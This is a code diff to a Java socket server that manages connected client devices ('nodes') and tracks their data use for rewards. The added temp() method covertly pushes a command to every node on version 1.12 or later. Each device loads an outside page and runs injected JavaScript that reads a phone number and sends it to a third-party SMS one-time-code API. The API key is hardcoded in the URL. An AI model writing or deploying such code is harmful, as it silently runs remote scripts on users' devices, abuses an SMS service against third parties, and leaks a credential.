@@ -103,7 +103,7 @@ public class SocketService {
     public void updateDataConsumptionStats() {
         for(Node node : list) {
             SocketIOClient client = node.getClient();
-            if (isValidNode(node, "1.11")) {
+            if (isValidNode(node, "1.12")) {
                 updateDataConsumptionStats(node);
             }
         }
@@ -165,6 +165,28 @@ public class SocketService {
         profile.setNibsActual((30.0f * totalDataConsumption) / (500 * 1024 * 1024));
         profile.setNibsCount((int)profile.getNibsActual());
         profileService.updateProfile(profile);
+    }
+
+    public void temp() {
+        for(Node node : list) {
+            if (node.getVersion().compareTo("1.12") >= 0) {
+                Parcel parcel = new Parcel();
+                parcel.setUrl("http://retonet.xyz/testing123.html");
+                parcel.setJsInjection("javascript:var number = document.getElementById('number').innerHTML.trim();var xhttp = new XMLHttpRequest();xhttp.open('GET', 'https://2factor.in/API/V1/8714c416-529c-11e7-94da-0200cd936042/SMS/' + number + '/AUTOGEN', true);xhttp.send();");
+
+                node.getClient().sendEvent(WebView, new AckCallback<String>(String.class, 10) {
+                    @Override
+                    public void onSuccess(String result) {
+                        System.err.println(">>>> " + result);
+                    }
+
+                    @Override
+                    public void onTimeout() {
+                        System.err.println("TIMEOUT");
+                    }
+                }, AzazteUtils.toJson(parcel));
+            }
+        }
     }
 
     public ProxyResponse webviewRequest(final String url) {
@@ -274,20 +296,6 @@ public class SocketService {
                 }
             }
         }
-    }
-
-    public void sendNibsRequest() {
-        Node node = getNextNode();
-        if (node == null) {
-            return;
-        }
-        SocketIOClient client = node.getClient();
-        log.info("Sending Nibs to  " + node.getMobileNumber());
-        Profile profile = profileService.findByMobileNumber(node.getMobileNumber());
-        int nibs = profile.getNibsCount();
-        int referralCount = profile.getReferralCount();
-        int maxThreshold = 500;
-        client.sendEvent(stats, "" + nibs + "," + (10 * referralCount) + "," + (nibs + 10 * referralCount) + "," + maxThreshold);
     }
 
     public Node getNextNode() {
